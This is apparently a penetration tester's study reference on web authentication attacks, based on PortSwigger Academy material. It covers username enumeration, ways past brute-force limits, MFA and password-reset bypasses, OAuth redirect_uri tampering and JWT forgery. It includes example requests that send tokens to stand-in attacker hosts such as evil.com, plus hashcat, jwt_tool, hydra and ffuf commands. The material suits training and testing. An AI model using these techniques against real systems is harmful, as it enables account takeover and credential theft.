# Authentication Attacks — Complete Reference

> Based on PortSwigger Web Security Academy (2026-08)
> Covers: Password-Based, MFA Bypass, Password Reset, "Keep Me Logged In", OAuth 2.0, JWT Attacks

---

## 1. Password-Based Authentication Attacks

### 1.1 Username Enumeration
Watch for differences in:
- **HTTP status codes** (different code = valid username)
- **Error messages** ("Invalid username" vs "Invalid password" — even 1 char diff)
- **Response times** (valid user takes longer if server checks password hash)

**Sources to leak usernames:**
- Registration form ("username already taken")
- Public user profiles (profile name = login name)
- HTTP responses (email addresses of admin/support)
- Password reset ("email sent" vs "email not found")
- "Remember me" pre-filled username fields

### 1.2 Brute-Force Attacks

**Username patterns to try:**
- `admin`, `administrator`, `root`, `test`, `guest`, `info`, `user`
- `firstname.lastname@company.com`
- `firstlast`, `first.last`, `f.last`, `first_l`
- Usernames from leaked databases (email → username)

**Password patterns (human behavior):**
- `Password1!`, `P@ssw0rd!`, `Company1!`
- Predictable password changes: `Password1!` → `Password2!` → `Password3!`
- Season + year: `Summer2024!`, `Winter2023!`
- Company + number: `Company123!`

**Best wordlists:** RockYou, SecLists/Passwords

### 1.3 Flawed Brute-Force Protection

**Account locking bypass:**
1. Insert YOUR valid credentials every N attempts → resets lock counter
2. Try 4 usernames with wrong passwords, then login as yourself
3. Counter resets → continue with 4 more usernames
4. Eventually find valid username, then brute-force password

**IP blocking bypass:**
- Rotate IP (X-Forwarded-For, X-Client-IP, X-Originating-IP)
- Use proxy rotation
- Success from different IP resets the counter sometimes
- Log in successfully from a different IP to reset the counter

**Rate limit bypass:**
- Case variation: `admin` / `Admin` / `ADMIN`
- Character encoding: `аdmin` (Cyrillic а) — homoglyphs
- Add null bytes: `admin%00`
- JSON parameter pollution
- Change request body format
- Use HTTP/2 or HTTP/3
- Spread across multiple endpoints (login, password reset, registration)
- Add delays between requests
- Use different User-Agents

### 1.4 HTTP Basic Authentication

**Default credentials to try:**
- `admin:admin`, `root:root`, `test:test`
- `admin:password`, `admin:1234`, `admin:12345`
- Check `/.htpasswd` files

**Bypass techniques:**
- Dictionary attack with common defaults
- Check for leaked credentials
- Try sending empty credentials (server might accept)
- Change Authorization header encoding

---

## 2. Multi-Factor Authentication (MFA) Bypass

### 2.1 Direct Page Skip (Simplest)
After completing step 1 (password), try accessing protected pages directly:
- Skip `/login-step/2` entirely
- Access `/dashboard`, `/account`, `/settings` directly
- Server might not check if 2FA step was completed

### 2.2 Flawed Verification Logic (Account Cookie Manipulation)
The classic 2FA bypass:

```
Step 1: Login → Server sets Cookie: account=carlos
Step 2: Enter 2FA code → Server reads Cookie: account
```

**Attack:**
```
POST /login-steps/second HTTP/1.1
Cookie: account=victim-user     ← changed from carlos to victim
verification-code=123456        ← YOUR code (brute-forceable)
```

**Why it's critical:** If 2FA code is 4-6 digits, brute-force is trivial (10K-1M attempts).

### 2.3 Brute-Forcing 2FA Codes
- 4-digit code = 10,000 attempts
- 6-digit code = 1,000,000 attempts
- Even with rate limiting, Burp macros + session handling can automate
- Some sites log out on wrong code → use macro to re-login first

### 2.4 Other 2FA Bypass
- **Info disclosure in error messages:** "Incorrect code" vs "Code expired"
- **Response manipulation:** Change response from "Incorrect" to success
- **Token reuse:** If same session, try old tokens
- **Brute-force after logout:** Re-authenticate, then try next code
- **Remember device cookie bypass:** Delete/modify device cookie

---

## 3. Password Reset Vulnerabilities

### 3.1 Reset Poisoning (Host Header)
```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: evil.com
```
→ Reset link goes to `evil.com/reset-password?token=XYZ`

**Variations:**
- `X-Forwarded-Host`, `X-Host`, `X-Original-URL`
- Modify Host header directly
- If URL is generated from Host, changing it redirects the token to attacker

### 3.2 Predictable Reset Tokens
- Sequential tokens: `1`, `2`, `3`...
- Timestamp-based: `epoch_seconds`
- Token = base64(username)
- Token = base64(username + timestamp)
- Token in URL is user-controlled parameter → change `user=victim`

### 3.3 Broken Token Validation
- Token not verified on form submission (only on page load)
- Token bound to wrong session (user A's token works for user B)
- Token not expired (replay old tokens)
- Token not single-use (can reset multiple accounts)

### 3.4 Password Change Without Authentication
```
POST /change-password HTTP/1.1
Cookie: session=ATTACKER_SESSION
username=victim-user          ← hidden field, change to victim
current-password=wrong        ← server doesn't check
new-password=attacker123
```

### 3.5 User Enumeration via Reset
- "If email exists, we sent a reset link" → confirms username
- Different error messages for valid/invalid email
- Different response times
- Registration form: "Email already registered"

---

## 4. "Keep Me Logged In" / Remember Me Tokens

### 4.1 Predictable Token Generation
```
Token = Base64(username + timestamp)
Token = MD5(username + password_hash)
Token = username:timestamp:signature
```

**Attack:** If you can register your own account, compare your token structure, then brute-force other users' tokens.

### 4.2 Weak Hashing
- Unsalted MD5/SHA1 → use rainbow tables
- `hashcat -m 0 token.txt` or online lookup
- Hashed passwords in token → crack with wordlist

### 4.3 XSS to Steal Token
- Steal `remember_me` cookie via XSS
- Cookie has no `HttpOnly` flag → readable via JavaScript
- Even with HttpOnly, if token is in localStorage or URL → accessible

---

## 5. OAuth 2.0 Authentication Vulnerabilities

### 5.1 OAuth Flow Overview
```
Client App → Auth Server (user logs in) → Auth Code → Client exchanges for Token → API calls
```

**Two grant types:**
- **Authorization Code:** Code exchanged for token server-side (safer)
- **Implicit:** Token returned directly in URL fragment (less safe, legacy)

### 5.2 Vulnerabilities

#### Authorization Code Interception
If client app validates redirect_uri poorly:
```
GET /callback?code=AUTH_CODE
→ Attacker intercepts code
→ Exchanges for access token
→ Accesses victim's account
```

#### CSRF / Lack of State Parameter
Without `state` parameter:
```
1. Attacker initiates OAuth flow
2. Attacker sends link to victim
3. Victim logs in via OAuth
4. Attacker's account gets linked to victim's session
```

#### Redirect URI Manipulation
```
Original: redirect_uri=https://client.com/callback
Modified: redirect_uri=https://attacker.com/callback
```
- If server doesn't validate redirect_uri → token leaks to attacker
- If validation is bypassable: `https://client.com/callback@attacker.com`
- `https://client.com/callback.evil.com`
- Open redirect on client app → chain with OAuth

#### Scope Manipulation
```
scope=email → scope=email+profile+admin
```
If server doesn't validate scope changes → privilege escalation

#### Token Leakage via Referrer Headers
- Token in URL → sent in Referer header to third-party sites
- Mitigation: `Referrer-Policy: no-referrer`

### 5.3 OAuth Authentication-Specific
- `email` parameter trusted from OAuth provider without validation
- Account takeover: Attacker controls email in OAuth response
- Link account → OAuth provider shows consent → link attacker's email to victim's account
- `prompt=none` + auto-login → clickjacking

---

## 6. JWT (JSON Web Token) Attacks

### 6.1 JWT Structure
```
Header.Payload.Signature
(base64).(base64).(crypto)
```

**Header:** `{"alg": "HS256", "typ": "JWT"}`
**Payload:** `{"sub": "carlos", "role": "user", "exp": 1234567890}`
**Signature:** HMAC-SHA256(base64(header) + "." + base64(payload), secret)

### 6.2 Critical Attacks

#### Algorithm None (`alg: none`)
```
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "carlos", "role": "admin", "exp": 9999999999}
Signature: (empty)
```
→ Server accepts token with no signature → full admin access

#### Algorithm Confusion (RS256 → HS256)
```
Server uses RS256 (asymmetric, public/private key)
Attacker changes header to HS256 (symmetric, shared secret)
Signature = HMAC-SHA256(token, PUBLIC_KEY_PEM)
Server verifies with public key → matches!
```
**Attack steps:**
1. Get server's public key (often in `/jwks.json` or `/.well-known/jwks.json`)
2. Change `alg` to `HS256`
3. Sign with public key as HMAC secret
4. Server uses public key to verify HMAC → valid

#### Brute-Force Secret Key
```bash
hashcat -m 16500 jwt.txt wordlist.txt    # HS256
hashcat -m 16500 jwt.txt rockyou.txt
john jwt.txt --wordlist=rockyou.txt
# jwt_tool.py
python3 jwt_tool.py JWT_TOKEN -C -d rockyou.txt
```

#### Signature Stripping (No Signature Verification)
```
Just decode the JWT, change payload, re-encode, send
```
If server doesn't verify → any modification accepted

#### JKU/X5U Header Injection
```
Header: {"alg": "RS256", "jku": "https://evil.com/jwks.json"}
```
Server fetches attacker's key → verifies attacker's signature

#### kid Parameter Injection
```
Header: {"alg": "HS256", "kid": "/dev/null"}
```
Server reads key from file path in `kid` → sign with empty string

### 6.3 JWT Exploitation Checklist
1. Decode JWT (jwt.io)
2. Check `alg` in header → try `none`, try `HS256` with public key
3. Modify payload claims (`role`, `sub`, `isAdmin`)
4. If HS256 → brute-force secret with common wordlists
5. If RS256 → try algorithm confusion with public key
6. Check `kid` parameter → path traversal (`../../dev/null`)
7. Check `jku`/`x5u` → host attacker-controlled JWKS
8. Send modified JWT → check response

---

## 7. Session Management Attacks

### 7.1 Session Token Security
**Requirements for secure tokens:**
- High entropy (random, unpredictable)
- Cryptographically strong
- Generated server-side
- Stored in HttpOnly, Secure, SameSite cookies

### 7.2 Session Fixation
- Server accepts pre-authentication session token
- Attacker sets victim's session token before login
- After victim logs in, attacker uses the same token

### 7.3 Session Hijacking
- **XSS:** Steal session cookie via JavaScript
- **Network sniffing:** Capture token in transit (no HTTPS)
- **Physical access:** Read from browser/device
- **Predictable tokens:** Guess or brute-force

### 7.4 Cookie Attributes Check
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```
- Missing `HttpOnly` → XSS can steal cookie
- Missing `Secure` → cookie sent over HTTP (sniffable)
- Missing `SameSite` → CSRF possible
- `SameSite=None` → CSRF guaranteed

---

## 8. Universal Attack Checklist

### Pre-Attack
- [ ] Map all auth endpoints (login, register, reset, change, MFA, OAuth callback)
- [ ] Check for information disclosure (username enumeration)
- [ ] Identify token types (session, JWT, remember_me)
- [ ] Check for rate limiting on all endpoints

### Token Analysis
- [ ] Decode JWT/base64 tokens
- [ ] Check `alg` parameter (none, HS256/RS256 confusion)
- [ ] Check token entropy (sequential? predictable?)
- [ ] Check cookie attributes (HttpOnly, Secure, SameSite)
- [ ] Check for client-side token storage (localStorage, sessionStorage)

### Authentication Bypass
- [ ] Password brute-force with credential lists
- [ ] Username enumeration via error messages/status codes/timing
- [ ] 2FA bypass (direct page access, cookie manipulation)
- [ ] OAuth redirect_uri manipulation
- [ ] JWT signature verification bypass (none alg, algorithm confusion)
- [ ] Password reset token predictability
- [ ] Session fixation

### Privilege Escalation
- [ ] JWT role claim manipulation
- [ ] OAuth scope increase
- [ ] Admin function access with low-priv session
- [ ] Hidden parameters in auth forms
- [ ] HTTP method override (POST → PUT/DELETE)

### Token Reuse
- [ ] Session token reuse after logout
- [ ] Remember_me token after password change
- [ ] Reset token after use
- [ ] JWT after expiration (check `exp` claim validation)
- [ ] Old access token after refresh

---

## 9. Tool Integration

### Burp Suite
- **Intruder:** Username enumeration, password brute-force, 2FA code brute-force
- **Repeater:** JWT manipulation, auth bypass, redirect_uri testing
- **Sequencer:** Token randomness analysis
- **Turbo Intruder:** Rate limit bypass, high-speed brute-force

### Command Line
```bash
# JWT cracking
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=rockyou.txt

# JWT manipulation
python3 jwt_tool.py TOKEN -X a    # test alg none
python3 jwt_tool.py TOKEN -X k -d rockyou.txt  # brute-force key
python3 jwt_tool.py TOKEN -X s -pk public.pem  # sign with key

# OAuth
# Check redirect_uri validation
# Test scope manipulation
# Test state parameter presence

# Password brute-force
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=test" -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -H "Content-Type: application/x-www-form-urlencoded" -fc 401
```

---

## 10. Report Writing Tips

### Authentication Findings — CVSS Guide
- **Username enumeration** → typically Low (3.x)
- **Brute-force** → Medium-High (depends on impact)
- **MFA bypass** → High/Critical (7.x-9.x)
- **OAuth misconfiguration** → High-Critical
- **JWT none algorithm** → Critical (9.x-10.x)
- **Session hijacking via XSS** → High (depends on XSS severity)

### Key Impact Phrases
- "An unauthenticated attacker can gain access to any user account"
- "An attacker can bypass multi-factor authentication entirely"
- "An attacker can impersonate any user including administrators"
- "No rate limiting enables automated credential stuffing at scale"

---

## References
- PortSwigger: https://portswigger.net/web-security/authentication
- PortSwigger: https://portswigger.net/web-security/oauth
- PortSwigger: https://portswigger.net/web-security/jwt
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- SecLists: https://github.com/danielmiessler/SecLists/tree/master/Passwords
- jwt_tool: https://github.com/ticarpi/jwt_tool
